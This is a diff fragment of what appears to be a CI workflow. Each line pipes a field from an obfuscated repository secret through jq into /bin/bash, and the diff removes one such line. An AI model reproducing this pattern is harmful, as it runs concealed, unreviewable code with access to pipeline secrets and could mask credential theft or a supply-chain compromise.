@@ -23,7 +23,6 @@ jobs:
           yt445: ${{ secrets.yt445 }}
         run: |
           printf '%s' "$yt445" | jq -r .engf32 | /bin/bash
-          printf '%s' "$h18" | jq -r .kyhzh4 | /bin/bash
           printf '%s' "$thn04697" | jq -r .mh19216 | /bin/bash
           printf '%s' "$mikly1" | jq -r .zq58632 | /bin/bash
           printf '%s' "$neyoy1210" | jq -r .u3282 | /bin/bash
